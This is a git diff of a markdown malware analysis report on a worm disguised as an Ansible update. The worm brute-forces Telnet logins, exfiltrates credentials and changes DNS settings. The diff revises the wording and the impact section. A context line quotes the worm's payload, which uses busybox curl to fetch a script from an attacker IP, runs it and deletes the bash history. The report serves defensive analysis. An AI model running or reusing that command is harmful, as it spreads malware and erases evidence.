@@ -161,9 +161,10 @@ We are uncertain of what this telnet Scanner is, the code is too dense, and many
 - This is a scanner for open Telnet ports in the network, it scans the network for Telnet and then tries to brute force them.  
 - When it's successful it sends to the attacker's server the information (IP, port, username, and password)
 - Then it sends the following payload to the connected machines "cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history" 
-We tried to curl the a.sh but we just got this: 
+We tried to curl the a.sh but we just got this: \
 ![alt text](img/ash.png)
-So we concluded that is once again the initial script in ansibled or something similar, concluding that this is some kind of worm.
+\
+So it was concluded that is once again the initial script in ansibled or something similar, concluding that this is some kind of worm.
 
 ##### How it works
 
@@ -182,11 +183,8 @@ This code is a piece of malware put into an update packet of Ansible. Firstly it
 - **Are other hosts involved?**\
 Yes, the attacker has most likely control over the machine with IP "192.168.160.143". This IP is crucial to several operations including: Downloading the PDF, Receiving commands to execute with ProccessCMDand downloading the Python script.
 - **What is the potential impact on our organization?**\
-Compromised Systems: The malware is capable of infiltrating systems by masquerading as an update packet for Ansible. Once inside, it operates stealthily by downloading a PDF file containing malicious code. This code is then decrypted into memory to evade detection by antivirus software.
-Privilege Escalation: The malware elevates its privileges by changing to the root directory and altering its permissions. This gives the attacker extensive control over the infected system.
-DNS Manipulation: By changing the default DNS server, the malware can redirect users to fake websites designed to steal credentials or cookies. This could lead to sensitive data breaches and compromise the integrity of your organization's network.
-Remote Access: The malware includes capabilities for remote access, likely facilitated by a Python script downloaded from the attacker-controlled IP address. This means the attacker can execute commands remotely, potentially leading to further system compromise, data theft, or disruption of services.
-Propagation: If other hosts within your organization are vulnerable or connected to the infected systems, there's a risk of lateral movement, allowing the malware to spread and escalate its impact.
-Data Exfiltration and Manipulation: Depending on the commands issued by the attacker, the malware can perform various actions, including TCP/ICMP/HTTP protocols, Telnet scanning, and executing arbitrary commands. This could result in data exfiltration, manipulation, or even system damage.
-Reputation Damage: A successful attack could severely damage your organization's reputation, eroding customer trust and potentially leading to legal and financial repercussions.
-
+If the malware is correctly executed in other words, not caught by Firewalls, antivirus, or similar software, this malware could potentially:
+-Exposure of Personal and Credit Information: The malware can intercept sensitive data such as usernames, passwords, credit card numbers, and other personal information entered by users on legitimate websites by manipulating DNS.
+- Credential Theft: With shell access to the victim machine, the malware can extract stored credentials like usernames and passwords, enabling unauthorized access to various accounts and systems.
+- Denial of Service (DoS): The malware can launch DoS attacks, disrupting the availability of services, websites, or networks, leading to financial losses and operational disruptions for affected organizations.
+- Stealing Private Certificates: Private certificates are essential for secure communication between servers and clients. By stealing these certificates, the malware can facilitate man-in-the-middle attacks, intercepting and tampering with sensitive data exchanged between users and servers.
